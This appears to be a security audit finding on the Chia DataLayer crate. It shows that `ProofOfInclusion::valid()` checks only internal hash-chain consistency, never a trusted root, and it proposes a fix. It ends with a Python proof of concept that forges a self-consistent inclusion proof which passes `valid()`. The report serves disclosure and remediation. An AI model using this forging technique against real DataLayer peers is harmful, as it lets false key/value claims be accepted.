### Title
`ProofOfInclusion::valid()` Is Self-Referential and Never Verifies Against an External Trusted Root Hash - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate only verifies internal hash-chain consistency within the proof itself. The final equality check `existing_hash == self.root_hash()` is a tautology — it always evaluates to `true` when layers are non-empty — because `existing_hash` is set to the same value that `root_hash()` returns. No external trusted root is ever compared. An attacker who can supply a serialized `ProofOfInclusion` to any caller that relies solely on `valid()` can forge a proof of inclusion for any key in any tree.

### Finding Description

`ProofOfInclusion` is a `Streamable` struct (serializable/deserializable over the network) exposed via Python bindings. Its `valid()` method is the sole verification API:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true: root_hash() == layers.last().combined_hash
}
```

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same field existing_hash was just set to
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds `calculated_hash` from the last iteration, which was just verified to equal `layer.combined_hash` of the last layer. `self.root_hash()` returns exactly `self.layers.last().combined_hash`. The final check is therefore a tautology: it can never be `false` after a successful loop. The method only verifies that the proof's own hash chain is internally self-consistent; it never compares the computed root against any external, trusted root hash.

An attacker can construct a `ProofOfInclusion` with an arbitrary `node_hash` (claiming any key/value pair is included) and a consistent chain of fabricated layers, and `valid()` will return `true`. The proof is accepted as valid for a completely different tree than the one the caller intends to verify against.

### Impact Explanation

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

Any DataLayer client that receives a `ProofOfInclusion` from an untrusted peer and calls only `proof.valid()` — without separately comparing `proof.root_hash()` against a locally-known trusted root — will accept forged proofs. This allows an attacker to:

- Prove that an arbitrary key is present in a DataLayer store when it is not.
- Prove that a key maps to an arbitrary value, enabling unauthorized state assertions.

The `ProofOfInclusion` type is `Streamable` (network-serializable) and exposed via Python bindings (`py_valid`), making it directly reachable from untrusted network input.

### Likelihood Explanation

The vulnerability is reachable whenever a caller receives a `ProofOfInclusion` from an external source and calls `valid()` as the sole verification step. The `ProofOfInclusion` type is designed to be transmitted (it is `Streamable` and has `from_bytes`/`to_bytes`). The Python API exposes `valid()` as the verification method with no parameter for an external root. Any DataLayer peer-verification code that follows the natural API usage pattern is vulnerable.

### Recommendation

`valid()` must accept an external trusted root hash parameter and compare the computed root against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root   // compare against externally-supplied trusted root
}
```

The no-argument `valid()` should either be removed or clearly documented as only checking internal consistency (not security). The Python binding should expose `valid_against_root(trusted_root: bytes32) -> bool` as the primary verification API.

### Proof of Concept

```python
from chia_rs.datalayer import (
    MerkleBlob, ProofOfInclusion, ProofOfInclusionLayer, KeyId, ValueId
)
import hashlib

# Build a real tree with key A
blob = MerkleBlob(blob=bytearray())
blob.insert(KeyId(1), ValueId(100), bytes(range(32)))
blob.calculate_lazy_hashes()
real_proof = blob.get_proof_of_inclusion(KeyId(1))
real_root = real_proof.root_hash()

# Forge a proof claiming key B (never inserted) is in the same tree.
# Construct a self-consistent but fake proof chain.
fake_node_hash = bytes([0xAB] * 32)
fake_sibling   = bytes([0xCD] * 32)
# Compute combined_hash the same way the library does (sha256(b"\x02" + left + right))
combined = hashlib.sha256(b"\x02" + fake_node_hash + fake_sibling).digest()

fake_layer = ProofOfInclusionLayer(
    other_hash_side=1,          # sibling is on the right
    other_hash=fake_sibling,
    combined_hash=combined,     # self-consistent
)
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[fake_layer])

# valid() returns True even though this proof is for a completely different tree
assert forged_proof.valid(), "Forged proof accepted!"

# The forged root differs from the real tree's root — but valid() never checks this
assert forged_proof.root_hash() != real_root, "Different roots, same valid() result"
print("Forged proof passes valid() — root mismatch is never detected")
```
